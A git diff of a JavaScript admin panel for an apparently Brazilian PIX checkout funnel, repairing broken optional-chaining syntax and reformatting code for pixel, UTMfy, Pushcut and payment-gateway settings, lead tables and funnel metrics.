+                    lead: tiktokPixelEventLead?.checked !== false,
+                    purchase: tiktokPixelEventPurchase?.checked !== false,
+                    checkout: tiktokPixelEventCheckout?.checked !== false
                 }
             };
         }
 
         if (hasUtmfyForm) {
             payload.utmfy = {
-                ...(currentSettings ? .utmfy || {}),
-                enabled: !!utmfyEnabled ? .checked,
-                endpoint: utmfyEndpoint ? .value ? .trim() || '',
-                apiKey: utmfyApi ? .value ? .trim() || ''
+                ...(currentSettings?.utmfy || {}),
+                enabled: !!utmfyEnabled?.checked,
+                endpoint: utmfyEndpoint?.value?.trim() || '',
+                apiKey: utmfyApi?.value?.trim() || ''
             };
-            const createdUrl = pushcutPixCreated ? .value ? .trim() || '';
-            const confirmedUrl = pushcutPixConfirmed ? .value ? .trim() || '';
+            const createdUrl = pushcutPixCreated?.value?.trim() || '';
+            const confirmedUrl = pushcutPixConfirmed?.value?.trim() || '';
             payload.pushcut = {
-                ...(currentSettings ? .pushcut || {}),
-                enabled: !!pushcutEnabled ? .checked,
+                ...(currentSettings?.pushcut || {}),
+                enabled: !!pushcutEnabled?.checked,
                 pixCreatedUrl: createdUrl,
                 pixCreatedUrl2: '',
                 pixCreatedUrls: createdUrl ? [createdUrl] : [],
@@ -6807,31 +5966,31 @@ function initAdmin() {
                 pixConfirmedUrl2: '',
                 pixConfirmedUrls: confirmedUrl ? [confirmedUrl] : [],
                 templates: {
-                    ...(currentSettings ? .pushcut ? .templates || {}),
-                    pixCreatedTitle: pushcutCreatedTitle ? .value ? .trim() || '',
-                    pixCreatedMessage: pushcutCreatedMessage ? .value ? .trim() || '',
-                    pixConfirmedTitle: pushcutConfirmedTitle ? .value ? .trim() || '',
-                    pixConfirmedMessage: pushcutConfirmedMessage ? .value ? .trim() || ''
+                    ...(currentSettings?.pushcut?.templates || {}),
+                    pixCreatedTitle: pushcutCreatedTitle?.value?.trim() || '',
+                    pixCreatedMessage: pushcutCreatedMessage?.value?.trim() || '',
+                    pixConfirmedTitle: pushcutConfirmedTitle?.value?.trim() || '',
+                    pixConfirmedMessage: pushcutConfirmedMessage?.value?.trim() || ''
                 }
             };
         }
 
         if (hasPaymentsForm) {
             const gatewayOrder = getGatewayOrderFromUi();
-            const activeGateway = normalizeGatewayKey(gatewayOrder[0] || paymentsActiveGateway ? .value || 'ghostspay');
+            const activeGateway = normalizeGatewayKey(gatewayOrder[0] || paymentsActiveGateway?.value || 'ghostspay');
             const currentGhostspay = getCurrentGatewaySettings('ghostspay');
             const currentSunize = getCurrentGatewaySettings('sunize');
             const currentParadise = getCurrentGatewaySettings('paradise');
             const currentAtomopay = getCurrentGatewaySettings('atomopay');
             const currentBravoPay = getCurrentGatewaySettings('bravopay');
             payload.payments = {
-                ...(currentSettings ? .payments || {}),
+                ...(currentSettings?.payments || {}),
                 activeGateway,
                 gatewayOrder,
                 gateways: {
-                    ...(currentSettings ? .payments ? .gateways || {}),
+                    ...(currentSettings?.payments?.gateways || {}),
                     ghostspay: {
-                        ...(currentSettings ? .payments ? .gateways ? .ghostspay || {}),
+                        ...(currentSettings?.payments?.gateways?.ghostspay || {}),
                         enabled: readCheckboxSetting(gatewayGhostspayEnabled, currentGhostspay.enabled),
                         baseUrl: readInputSetting(gatewayGhostspayBaseUrl, currentGhostspay.baseUrl),
                         secretKey: readInputSetting(gatewayGhostspaySecretKey, currentGhostspay.secretKey),
@@ -6839,14 +5998,14 @@ function initAdmin() {
                         webhookToken: readInputSetting(gatewayGhostspayWebhookToken, currentGhostspay.webhookToken)
                     },
                     sunize: {
-                        ...(currentSettings ? .payments ? .gateways ? .sunize || {}),
+                        ...(currentSettings?.payments?.gateways?.sunize || {}),
                         enabled: readCheckboxSetting(gatewaySunizeEnabled, currentSunize.enabled),
                         baseUrl: readInputSetting(gatewaySunizeBaseUrl, currentSunize.baseUrl),
                         apiKey: readInputSetting(gatewaySunizeApiKey, currentSunize.apiKey),
                         apiSecret: readInputSetting(gatewaySunizeApiSecret, currentSunize.apiSecret)
                     },
                     paradise: {
-                        ...(currentSettings ? .payments ? .gateways ? .paradise || {}),
+                        ...(currentSettings?.payments?.gateways?.paradise || {}),
                         enabled: readCheckboxSetting(gatewayParadiseEnabled, currentParadise.enabled),
                         baseUrl: readInputSetting(gatewayParadiseBaseUrl, currentParadise.baseUrl),
                         apiKey: readInputSetting(gatewayParadiseApiKey, currentParadise.apiKey),
@@ -6856,7 +6015,7 @@ function initAdmin() {
                         description: readInputSetting(gatewayParadiseDescription, currentParadise.description)
                     },
                     atomopay: {
-                        ...(currentSettings ? .payments ? .gateways ? .atomopay || {}),
+                        ...(currentSettings?.payments?.gateways?.atomopay || {}),
                         enabled: readCheckboxSetting(gatewayAtomopayEnabled, currentAtomopay.enabled),
                         baseUrl: readInputSetting(gatewayAtomopayBaseUrl, currentAtomopay.baseUrl),
                         apiToken: readInputSetting(gatewayAtomopayApiToken, currentAtomopay.apiToken),
@@ -6871,7 +6030,7 @@ function initAdmin() {
                         webhookToken: readInputSetting(gatewayAtomopayWebhookToken, currentAtomopay.webhookToken)
                     },
                     bravopay: {
-                        ...(currentSettings ? .payments ? .gateways ? .bravopay || {}),
+                        ...(currentSettings?.payments?.gateways?.bravopay || {}),
                         enabled: readCheckboxSetting(gatewayBravoPayEnabled, currentBravoPay.enabled),
                         baseUrl: readInputSetting(gatewayBravoPayBaseUrl, currentBravoPay.baseUrl),
                         apiKey: readInputSetting(gatewayBravoPayApiKey, currentBravoPay.apiKey),
@@ -6885,8 +6044,8 @@ function initAdmin() {
 
         if (hasFeatureForm) {
             payload.features = {
-                ...(currentSettings ? .features || {}),
-                orderbump: featureOrderbump ? .checked !== false
+                ...(currentSettings?.features || {}),
+                orderbump: featureOrderbump?.checked !== false
             };
         }
 
@@ -6897,16 +6056,16 @@ function initAdmin() {
         const result = await res.json().catch(() => ({}));
 
         if (saveStatus) {
-            saveStatus.textContent = res.ok ?
-                'Configuracoes salvas.' :
-                (result ? .error || 'Falha ao salvar.');
+            saveStatus.textContent = res.ok
+                ? 'Configuracoes salvas.'
+                : (result?.error || 'Falha ao salvar.');
             setTimeout(() => {
                 if (saveStatus) saveStatus.textContent = '';
             }, 2500);
         }
         if (res.ok) {
             currentSettingsLoaded = false;
-            currentSettingsRevision = String(result ? .updatedAt || '').trim();
+            currentSettingsRevision = String(result?.updatedAt || '').trim();
             await loadSettings();
         }
         if (res.ok && hasPaymentsForm) {
@@ -6924,15 +6083,13 @@ function initAdmin() {
     const runPixelTest = async () => {
         if (testPixelStatus) testPixelStatus.textContent = 'Enviando evento...';
         const pixel = await ensurePixelConfig(true);
-        if (!pixel ? .enabled || !pixel.id) {
+        if (!pixel?.enabled || !pixel.id) {
             if (testPixelStatus) testPixelStatus.textContent = 'Pixel desativado ou sem ID.';
             showToast('Pixel nao configurado.', 'error');
             return;
         }
         loadFacebookPixel(pixel.id);
-        firePixelEvent('Lead', {
-            source: 'admin_test'
-        });
+        firePixelEvent('Lead', { source: 'admin_test' });
         if (testPixelStatus) testPixelStatus.textContent = 'Evento Lead enviado.';
         showToast('Evento teste enviado ao Pixel.', 'success');
     };
@@ -6940,14 +6097,12 @@ function initAdmin() {
     const runTikTokPixelTest = async () => {
         if (testTikTokPixelStatus) testTikTokPixelStatus.textContent = 'Enviando evento...';
         const pixel = await ensureTikTokPixelConfig(true);
-        if (!pixel ? .enabled || !pixel.id) {
+        if (!pixel?.enabled || !pixel.id) {
             if (testTikTokPixelStatus) testTikTokPixelStatus.textContent = 'Pixel desativado ou sem code.';
             showToast('Pixel do TikTok nao configurado.', 'error');
             return;
         }
-        loadTikTokPixel(pixel.id, {
-            firePageView: pixel.events ? .page_view !== false
-        });
+        loadTikTokPixel(pixel.id, { firePageView: pixel.events?.page_view !== false });
         fireTikTokPixelEvent('SubmitForm', {}, {
             event_id: `admin_test_${Date.now()}`
         });
@@ -6956,23 +6111,21 @@ function initAdmin() {
     };
 
     const runUtmfyTest = async () => {
-        if (!utmfyEnabled ? .checked || !(utmfyEndpoint ? .value || '').trim()) {
+        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
             if (testUtmfyStatus) testUtmfyStatus.textContent = 'Configure e salve o endpoint antes do teste.';
             showToast('Configure o UTMfy e salve.', 'error');
             return;
         }
         if (testUtmfyStatus) testUtmfyStatus.textContent = 'Enviando evento...';
-        const res = await adminFetch('/api/admin/utmfy-test', {
-            method: 'POST'
-        });
+        const res = await adminFetch('/api/admin/utmfy-test', { method: 'POST' });
         if (!res.ok) {
             const detail = await res.json().catch(() => ({}));
             const reason =
-                detail ? .detail ? .reason ||
-                detail ? .reason ||
-                detail ? .detail ? .detail ||
-                detail ? .detail ||
-                detail ? .error ||
+                detail?.detail?.reason ||
+                detail?.reason ||
+                detail?.detail?.detail ||
+                detail?.detail ||
+                detail?.error ||
                 'Falha ao enviar.';
             if (testUtmfyStatus) testUtmfyStatus.textContent = reason;
             showToast('Falha ao enviar evento UTMfy.', 'error');
@@ -6983,23 +6136,21 @@ function initAdmin() {
     };
 
     const runUtmfySale = async () => {
-        if (!utmfyEnabled ? .checked || !(utmfyEndpoint ? .value || '').trim()) {
+        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
             if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Configure e salve o endpoint antes do envio.';
             showToast('Configure o UTMfy e salve.', 'error');
             return;
         }
         if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Enviando venda...';
-        const res = await adminFetch('/api/admin/utmfy-sale', {
-            method: 'POST'
-        });
+        const res = await adminFetch('/api/admin/utmfy-sale', { method: 'POST' });
         if (!res.ok) {
             const detail = await res.json().catch(() => ({}));
             const reason =
-                detail ? .detail ? .reason ||
-                detail ? .reason ||
-                detail ? .detail ? .detail ||
-                detail ? .detail ||
-                detail ? .error ||
+                detail?.detail?.reason ||
+                detail?.reason ||
+                detail?.detail?.detail ||
+                detail?.detail ||
+                detail?.error ||
                 'Falha ao enviar.';
             if (saleUtmfyStatus) saleUtmfyStatus.textContent = reason;
             showToast('Falha ao enviar venda UTMfy.', 'error');
@@ -7010,13 +6161,13 @@ function initAdmin() {
     };
 
     const runPushcutTest = async () => {
-        if (!pushcutEnabled ? .checked) {
+        if (!pushcutEnabled?.checked) {
             if (testPushcutStatus) testPushcutStatus.textContent = 'Ative o Pushcut e salve antes do teste.';
             showToast('Ative o Pushcut e salve.', 'error');
             return;
         }
-        const hasCreated = !!(pushcutPixCreated ? .value || '').trim();
-        const hasConfirmed = !!(pushcutPixConfirmed ? .value || '').trim();
+        const hasCreated = !!(pushcutPixCreated?.value || '').trim();
+        const hasConfirmed = !!(pushcutPixConfirmed?.value || '').trim();
         if (!hasCreated && !hasConfirmed) {
             if (testPushcutStatus) testPushcutStatus.textContent = 'Informe ao menos uma URL de Pushcut.';
             showToast('Configure a URL de Pushcut.', 'error');
@@ -7024,24 +6175,22 @@ function initAdmin() {
         }
 
         if (testPushcutStatus) testPushcutStatus.textContent = 'Enviando teste...';
-        const res = await adminFetch('/api/admin/pushcut-test', {
-            method: 'POST'
-        });
+        const res = await adminFetch('/api/admin/pushcut-test', { method: 'POST' });
         const data = await res.json().catch(() => ({}));
 
-        if (!res.ok || !data ? .ok) {
-            const reason = data ? .error || data ? .detail ? .reason || 'Falha ao testar Pushcut.';
+        if (!res.ok || !data?.ok) {
+            const reason = data?.error || data?.detail?.reason || 'Falha ao testar Pushcut.';
             if (testPushcutStatus) testPushcutStatus.textContent = reason;
             showToast('Falha no teste do Pushcut.', 'error');
             return;
         }
 
-        const createdOk = !!data ? .results ? .pix_created ? .ok;
-        const confirmedOk = !!data ? .results ? .pix_confirmed ? .ok;
-        const createdSent = Number(data ? .results ? .pix_created ? .sent || (createdOk ? 1 : 0));
-        const createdTotal = Number(data ? .results ? .pix_created ? .total || (createdOk ? 1 : 0));
-        const confirmedSent = Number(data ? .results ? .pix_confirmed ? .sent || (confirmedOk ? 1 : 0));
-        const confirmedTotal = Number(data ? .results ? .pix_confirmed ? .total || (confirmedOk ? 1 : 0));
+        const createdOk = !!data?.results?.pix_created?.ok;
+        const confirmedOk = !!data?.results?.pix_confirmed?.ok;
+        const createdSent = Number(data?.results?.pix_created?.sent || (createdOk ? 1 : 0));
+        const createdTotal = Number(data?.results?.pix_created?.total || (createdOk ? 1 : 0));
+        const confirmedSent = Number(data?.results?.pix_confirmed?.sent || (confirmedOk ? 1 : 0));
+        const confirmedTotal = Number(data?.results?.pix_confirmed?.total || (confirmedOk ? 1 : 0));
         if (testPushcutStatus) {
             testPushcutStatus.textContent = `PIX criado: ${createdSent}/${createdTotal} | PIX confirmado: ${confirmedSent}/${confirmedTotal}`;
         }
@@ -7050,12 +6199,10 @@ function initAdmin() {
 
     const runDispatchProcess = async () => {
         if (processDispatchStatus) processDispatchStatus.textContent = 'Processando fila...';
-        const res = await adminFetch('/api/admin/dispatch-process', {
-            method: 'POST'
-        });
+        const res = await adminFetch('/api/admin/dispatch-process', { method: 'POST' });
         const data = await res.json().catch(() => ({}));
-        if (!res.ok || !data ? .ok) {
-            const reason = data ? .error || data ? .detail ? .reason || 'Falha ao processar fila.';
+        if (!res.ok || !data?.ok) {
+            const reason = data?.error || data?.detail?.reason || 'Falha ao processar fila.';
             if (processDispatchStatus) processDispatchStatus.textContent = reason;
             showToast('Falha ao processar fila.', 'error');
             return;
@@ -7069,7 +6216,7 @@ function initAdmin() {
     const renderLeads = (rows, append = false) => {
         if (!leadsBody) return;
         if (!append) leadsBody.innerHTML = '';
-        const esc = (value) => String(value ? ? '')
+        const esc = (value) => String(value ?? '')
             .replace(/&/g, '&amp;')
             .replace(/</g, '&lt;')
             .replace(/>/g, '&gt;')
@@ -7080,26 +6227,26 @@ function initAdmin() {
             const tr = document.createElement('tr');
             const sessionId = String(row.session_id || '').trim();
             const display = getLeadDisplayData(row);
-            const paymentItems = Array.isArray(display ? .payments) ? display.payments : [];
-            const journeyLabel = formatDetailValue(display ? .journey ? .label);
-            const journeyRaw = formatDetailValue(display ? .journey ? .raw || row.etapa);
-            const chargeLabel = formatDetailValue(display ? .charge ? .label);
-            const chargeOfferLabel = formatDetailValue(display ? .charge ? .offerLabel || chargeLabel);
-            const rewardName = formatDetailValue(display ? .selection ? .reward ? .name);
-            const shippingName = formatDetailValue(display ? .selection ? .shipping ? .name || row.frete);
-            const bumpSelected = display ? .selection ? .bump ? .selected === true && Number(display ? .selection ? .bump ? .price || 0) > 0;
-            const bumpTitle = formatDetailValue(display ? .selection ? .bump ? .title, 'Seguro Bag');
-            const currentAmount = Number(display ? .charge ? .amount ? ? row.valor_total);
+            const paymentItems = Array.isArray(display?.payments) ? display.payments : [];
+            const journeyLabel = formatDetailValue(display?.journey?.label);
+            const journeyRaw = formatDetailValue(display?.journey?.raw || row.etapa);
+            const chargeLabel = formatDetailValue(display?.charge?.label);
+            const chargeOfferLabel = formatDetailValue(display?.charge?.offerLabel || chargeLabel);
+            const rewardName = formatDetailValue(display?.selection?.reward?.name);
+            const shippingName = formatDetailValue(display?.selection?.shipping?.name || row.frete);
+            const bumpSelected = display?.selection?.bump?.selected === true && Number(display?.selection?.bump?.price || 0) > 0;
+            const bumpTitle = formatDetailValue(display?.selection?.bump?.title, 'Seguro Bag');
+            const currentAmount = Number(display?.charge?.amount ?? row.valor_total);
             const currentAmountText = Number.isFinite(currentAmount) ? formatCurrency(currentAmount) : '-';
-            const txid = formatDetailValue(display ? .charge ? .txid || row.pix_txid, '');
+            const txid = formatDetailValue(display?.charge?.txid || row.pix_txid, '');
             const campaign = String(row.utm_campaign_name || row.utm_campaign || '-').trim() || '-';
             const source = String(row.utm_source_label || row.utm_source || '-').trim() || '-';
             const term = String(row.utm_term_label || row.utm_term || '-').trim() || '-';
             const adset = String(row.utm_adset_name || row.utm_adset_label || row.utm_adset || '-').trim() || '-';
             const paymentPillsHtml = buildLeadStatusPillsHtml(paymentItems);
-            const paymentBlockHtml = paymentPillsHtml ?
-                `<div class="lead-stack"><div class="lead-stack__chips">${paymentPillsHtml}</div></div>` :
-                '';
+            const paymentBlockHtml = paymentPillsHtml
+                ? `<div class="lead-stack"><div class="lead-stack__chips">${paymentPillsHtml}</div></div>`
+                : '';
             const sessionNote = sessionId ? `Sessao ${formatLeadShortCode(sessionId, 10)}` : '-';
             const txidNote = txid ? `TXID ${formatLeadShortCode(txid, 10)}` : 'Sem TXID';
             const offerTags = [];
@@ -7178,8 +6325,8 @@ function initAdmin() {
         if (!nativeFunnelTrack) return;
 
         const funnel = funnelSummary && typeof funnelSummary === 'object' ? funnelSummary : null;
-        const stages = Array.isArray(funnel ? .stages) ? funnel.stages : [];
-        const base = Number(funnel ? .base || 0);
+        const stages = Array.isArray(funnel?.stages) ? funnel.stages : [];
+        const base = Number(funnel?.base || 0);
         if (nativeFunnelBase) nativeFunnelBase.textContent = `Base: ${base}`;
 
         nativeFunnelTrack.innerHTML = '';
@@ -7187,15 +6334,15 @@ function initAdmin() {
         if (!stages.length) return;
 
         stages.forEach((stage, index) => {
-            const rawCount = Number(stage ? .countRaw || 0);
-            const pctBase = Number(stage ? .pctFromBase || 0);
-            const pctPrev = Number(stage ? .pctFromPrev || 0);
-            const dropPct = Number(stage ? .dropPct || 0);
-            const directEntries = Number(stage ? .directEntries || 0);
+            const rawCount = Number(stage?.countRaw || 0);
+            const pctBase = Number(stage?.pctFromBase || 0);
+            const pctPrev = Number(stage?.pctFromPrev || 0);
+            const dropPct = Number(stage?.dropPct || 0);
+            const directEntries = Number(stage?.directEntries || 0);
             const progress = Math.max(0, Math.min(100, pctBase));
-            const prevLabel = index === 0 ?
-                'Referencia da base' :
-                `${formatPercentOneDecimal(pctPrev)} vs etapa anterior`;
+            const prevLabel = index === 0
+                ? 'Referencia da base'
+                : `${formatPercentOneDecimal(pctPrev)} vs etapa anterior`;
             const dropLabel = index === 0 ? '' : `Queda: ${formatPercentOneDecimal(dropPct)}`;
 
             const card = document.createElement('article');
@@ -7244,9 +6391,9 @@ function initAdmin() {
             const raw = String(value || '').trim();
             if (!SIMPLE_DATE_RE.test(raw)) return '';
             const [year, month, day] = raw.split('-').map(Number);
-            const date = endOfDay ?
-                new Date(year, month - 1, day, 23, 59, 59, 999) :
-                new Date(year, month - 1, day, 0, 0, 0, 0);
+            const date = endOfDay
+                ? new Date(year, month - 1, day, 23, 59, 59, 999)
+                : new Date(year, month - 1, day, 0, 0, 0, 0);
             return Number.isNaN(date.getTime()) ? '' : date.toISOString();
         };
         return {
@@ -7258,67 +6405,35 @@ function initAdmin() {
     const buildPresetRange = (preset) => {
         const today = toUtcDateInput(new Date());
         if (preset === 'today') {
-            return {
-                preset: 'today',
-                from: today,
-                to: today
-            };
+            return { preset: 'today', from: today, to: today };
         }
         if (preset === 'yesterday') {
             const day = shiftDateInput(today, -1);
-            return {
-                preset: 'yesterday',
-                from: day,
-                to: day
-            };
+            return { preset: 'yesterday', from: day, to: day };
         }
         if (preset === 'last7') {
-            return {
-                preset: 'last7',
-                from: shiftDateInput(today, -6),
-                to: today
-            };
+            return { preset: 'last7', from: shiftDateInput(today, -6), to: today };
         }
         if (preset === 'last30') {
-            return {
-                preset: 'last30',
-                from: shiftDateInput(today, -29),
-                to: today
-            };
+            return { preset: 'last30', from: shiftDateInput(today, -29), to: today };
         }
         if (preset === 'thisMonth') {
             const now = new Date();
             const from = `${now.getFullYear()}-${pad2(now.getMonth() + 1)}-01`;
-            return {
-                preset: 'thisMonth',
-                from,
-                to: today
-            };
+            return { preset: 'thisMonth', from, to: today };
         }
         if (preset === 'custom') {
-            return {
-                preset: 'custom',
-                from: '',
-                to: ''
-            };
+            return { preset: 'custom', from: '', to: '' };
         }
-        return {
-            preset: 'all',
-            from: '',
-            to: ''
-        };
+        return { preset: 'all', from: '', to: '' };
     };
 
     const sanitizeOverviewRange = (rangeInput = {}) => {
-        const preset = String(rangeInput ? .preset || 'all').trim();
-        const from = SIMPLE_DATE_RE.test(String(rangeInput ? .from || '').trim()) ? String(rangeInput.from).trim() : '';
-        const to = SIMPLE_DATE_RE.test(String(rangeInput ? .to || '').trim()) ? String(rangeInput.to).trim() : '';
+        const preset = String(rangeInput?.preset || 'all').trim();
+        const from = SIMPLE_DATE_RE.test(String(rangeInput?.from || '').trim()) ? String(rangeInput.from).trim() : '';
+        const to = SIMPLE_DATE_RE.test(String(rangeInput?.to || '').trim()) ? String(rangeInput.to).trim() : '';
         if (preset === 'custom') {
-            return {
-                preset,
-                from,
-                to
-            };
+            return { preset, from, to };
         }
         return buildPresetRange(preset);
     };
@@ -7332,15 +6447,11 @@ function initAdmin() {
     const loadOverviewRange = () => {
         try {
             const raw = localStorage.getItem(OVERVIEW_RANGE_STORAGE_KEY);
-            if (!raw) return sanitizeOverviewRange({
-                preset: 'all'
-            });
+            if (!raw) return sanitizeOverviewRange({ preset: 'all' });
             const parsed = JSON.parse(raw);
             return sanitizeOverviewRange(parsed);
         } catch (_error) {
-            return sanitizeOverviewRange({
-                preset: 'all'
-            });
+            return sanitizeOverviewRange({ preset: 'all' });
         }
     };
 
@@ -7375,10 +6486,7 @@ function initAdmin() {
     };
 
     const getActiveOverviewRange = () => {
-        if (!hasOverviewRangeControls) return {
-            from: '',
-            to: ''
-        };
+        if (!hasOverviewRangeControls) return { from: '', to: '' };
         if (overviewRange.preset === 'custom') {
             return {
                 from: String(overviewRange.from || '').trim(),
@@ -7386,19 +6494,16 @@ function initAdmin() {
             };
         }
         const built = buildPresetRange(overviewRange.preset || 'all');
-        return {
-            from: built.from || '',
-            to: built.to || ''
-        };
+        return { from: built.from || '', to: built.to || '' };
     };
 
     const applyOverviewRangeAndReload = async () => {
         if (!hasOverviewRangeControls) return;
-        const selectedPreset = String(overviewRangePreset ? .value || overviewRange.preset || 'all');
+        const selectedPreset = String(overviewRangePreset?.value || overviewRange.preset || 'all');
 
         if (selectedPreset === 'custom') {
-            const from = String(overviewRangeFrom ? .value || '').trim();
-            const to = String(overviewRangeTo ? .value || '').trim();
+            const from = String(overviewRangeFrom?.value || '').trim();
+            const to = String(overviewRangeTo?.value || '').trim();
             if (from && !SIMPLE_DATE_RE.test(from)) {
                 showToast('Data inicial invalida.', 'error');
                 return;
@@ -7411,24 +6516,16 @@ function initAdmin() {
                 showToast('Periodo invalido: data inicial maior que final.', 'error');
                 return;
             }
-            overviewRange = {
-                preset: 'custom',
-                from,
-                to
-            };
+            overviewRange = { preset: 'custom', from, to };
         } else {
             overviewRange = buildPresetRange(selectedPreset);
         }
 
         saveOverviewRange();
         syncOverviewRangeUi();
-        if (wantsLeads) await loadLeads({
-            reset: true
-        });
+        if (wantsLeads) await loadLeads({ reset: true });
         if (shouldAutoLoadSalesInsights) await loadSalesInsights();
-        if (wantsGatewaySales) await loadGatewaySales({
-            keepSelection: true
-        });
+        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
     };
 
     const initializeOverviewRange = () => {
@@ -7448,39 +6545,39 @@ function initAdmin() {
             metrics.funnel = summary.funnel && typeof summary.funnel === 'object' ? summary.funnel : null;
             metrics.gatewayStats = normalizeGatewayStatsMap(summary.gatewayStats || {});
         } else {
-            if (reset) {
-                metrics.total = 0;
-                metrics.pix = 0;
-                metrics.frete = 0;
-                metrics.cep = 0;
-                metrics.paid = 0;
-                metrics.lastUpdated = '';
-                metrics.funnel = null;
-                metrics.gatewayStats = emptyGatewayStats();
-            }
+        if (reset) {
+            metrics.total = 0;
+            metrics.pix = 0;
+            metrics.frete = 0;
+            metrics.cep = 0;
+            metrics.paid = 0;
+            metrics.lastUpdated = '';
+            metrics.funnel = null;
+            metrics.gatewayStats = emptyGatewayStats();
+        }
 
-            metrics.total += rows.length;
-            rows.forEach((row) => {
-                const cep = String(row.cep || '').trim();
-                const frete = String(row.frete || '').trim();
-                const pixTxid = String(row.pix_txid || '').trim();
-                const ev = String(row.evento || '').toLowerCase().trim();
-                const gateway = resolveGatewayMetricKey(row.gateway || '');
-                const gatewayStats = gateway ? metrics.gatewayStats[gateway] : null;
+        metrics.total += rows.length;
+        rows.forEach((row) => {
+            const cep = String(row.cep || '').trim();
+            const frete = String(row.frete || '').trim();
+            const pixTxid = String(row.pix_txid || '').trim();
+            const ev = String(row.evento || '').toLowerCase().trim();
+            const gateway = resolveGatewayMetricKey(row.gateway || '');
+            const gatewayStats = gateway ? metrics.gatewayStats[gateway] : null;
 
-                if (gatewayStats) gatewayStats.leads += 1;
-                if (pixTxid && pixTxid !== '-') metrics.pix += 1;
-                if (pixTxid && pixTxid !== '-' && gatewayStats) gatewayStats.pix += 1;
-                if (frete && frete !== '-') metrics.frete += 1;
-                if (cep && cep !== '-') metrics.cep += 1;
-                const isPaid = row.is_paid === true || ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
-                if (isPaid) metrics.paid += 1;
-                if (isPaid && gatewayStats) gatewayStats.paid += 1;
-                else if (ev === 'pix_refunded' && gatewayStats) gatewayStats.refunded += 1;
-                else if ((ev === 'pix_refused' || ev === 'pix_failed') && gatewayStats) gatewayStats.refused += 1;
-                else if ((ev === 'pix_pending' || ev === 'pix_created') && gatewayStats) gatewayStats.pending += 1;
-                if (!metrics.lastUpdated && (row.event_time || row.updated_at)) metrics.lastUpdated = row.event_time || row.updated_at;
-            });
+            if (gatewayStats) gatewayStats.leads += 1;
+            if (pixTxid && pixTxid !== '-') metrics.pix += 1;
+            if (pixTxid && pixTxid !== '-' && gatewayStats) gatewayStats.pix += 1;
+            if (frete && frete !== '-') metrics.frete += 1;
+            if (cep && cep !== '-') metrics.cep += 1;
+            const isPaid = row.is_paid === true || ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
+            if (isPaid) metrics.paid += 1;
+            if (isPaid && gatewayStats) gatewayStats.paid += 1;
+            else if (ev === 'pix_refunded' && gatewayStats) gatewayStats.refunded += 1;
+            else if ((ev === 'pix_refused' || ev === 'pix_failed') && gatewayStats) gatewayStats.refused += 1;
+            else if ((ev === 'pix_pending' || ev === 'pix_created') && gatewayStats) gatewayStats.pending += 1;
+            if (!metrics.lastUpdated && (row.event_time || row.updated_at)) metrics.lastUpdated = row.event_time || row.updated_at;
+        });
         }
 
         if (metricTotal) metricTotal.textContent = String(metrics.total);
@@ -7507,26 +6604,11 @@ function initAdmin() {
         if (funnelFreteValue) funnelFreteValue.textContent = `${pctFrete}%`;
         if (funnelCepValue) funnelCepValue.textContent = `${pctCep}%`;
 
-        const ghostStats = metrics.gatewayStats.ghostspay || {
-            pix: 0,
-            paid: 0
-        };
-        const sunizeStats = metrics.gatewayStats.sunize || {
-            pix: 0,
-            paid: 0
-        };
-        const paradiseStats = metrics.gatewayStats.paradise || {
-            pix: 0,
-            paid: 0
-        };
-        const atomopayStats = metrics.gatewayStats.atomopay || {
-            pix: 0,
-            paid: 0
-        };
-        const bravoPayStats = metrics.gatewayStats.bravopay || {
-            pix: 0,
-            paid: 0
-        };
+        const ghostStats = metrics.gatewayStats.ghostspay || { pix: 0, paid: 0 };
+        const sunizeStats = metrics.gatewayStats.sunize || { pix: 0, paid: 0 };
+        const paradiseStats = metrics.gatewayStats.paradise || { pix: 0, paid: 0 };
+        const atomopayStats = metrics.gatewayStats.atomopay || { pix: 0, paid: 0 };
+        const bravoPayStats = metrics.gatewayStats.bravopay || { pix: 0, paid: 0 };
         const ghostConv = ghostStats.pix ? Math.round((Number(ghostStats.paid || 0) / Number(ghostStats.pix || 0)) * 100) : 0;
         const sunizeConv = sunizeStats.pix ? Math.round((Number(sunizeStats.paid || 0) / Number(sunizeStats.pix || 0)) * 100) : 0;
         const paradiseConv = paradiseStats.pix ? Math.round((Number(paradiseStats.paid || 0) / Number(paradiseStats.pix || 0)) * 100) : 0;
@@ -7555,36 +6637,12 @@ function initAdmin() {
         }
 
         if (metricBestGateway) {
-            const options = [{
-                    label: 'GhostsPay',
-                    conv: ghostConv,
-                    paid: Number(ghostStats.paid || 0),
-                    pix: Number(ghostStats.pix || 0)
-                },
-                {
-                    label: 'Sunize',
-                    conv: sunizeConv,
-                    paid: Number(sunizeStats.paid || 0),
-                    pix: Number(sunizeStats.pix || 0)
-                },
-                {
-                    label: 'Paradise',
-                    conv: paradiseConv,
-                    paid: Number(paradiseStats.paid || 0),
-                    pix: Number(paradiseStats.pix || 0)
-                },
-                {
-                    label: 'AtomoPay',
-                    conv: atomopayConv,
-                    paid: Number(atomopayStats.paid || 0),
-                    pix: Number(atomopayStats.pix || 0)
-                },
-                {
-                    label: 'Bravo Pay',
-                    conv: bravoPayConv,
-                    paid: Number(bravoPayStats.paid || 0),
-                    pix: Number(bravoPayStats.pix || 0)
-                }
+            const options = [
+                { label: 'GhostsPay', conv: ghostConv, paid: Number(ghostStats.paid || 0), pix: Number(ghostStats.pix || 0) },
+                { label: 'Sunize', conv: sunizeConv, paid: Number(sunizeStats.paid || 0), pix: Number(sunizeStats.pix || 0) },
+                { label: 'Paradise', conv: paradiseConv, paid: Number(paradiseStats.paid || 0), pix: Number(paradiseStats.pix || 0) },
+                { label: 'AtomoPay', conv: atomopayConv, paid: Number(atomopayStats.paid || 0), pix: Number(atomopayStats.pix || 0) },
+                { label: 'Bravo Pay', conv: bravoPayConv, paid: Number(bravoPayStats.paid || 0), pix: Number(bravoPayStats.pix || 0) }
             ].filter((item) => item.pix > 0);
             if (!options.length) {
                 metricBestGateway.textContent = '-';
@@ -7602,16 +6660,14 @@ function initAdmin() {
         renderNativeFunnel(metrics.funnel);
     };
 
-    const loadLeads = async ({
-        reset = false
-    } = {}) => {
+    const loadLeads = async ({ reset = false } = {}) => {
         if (loadingLeads) return;
         loadingLeads = true;
         if (reset) {
             offset = 0;
         }
 
-        const query = leadsSearch ? .value.trim() || '';
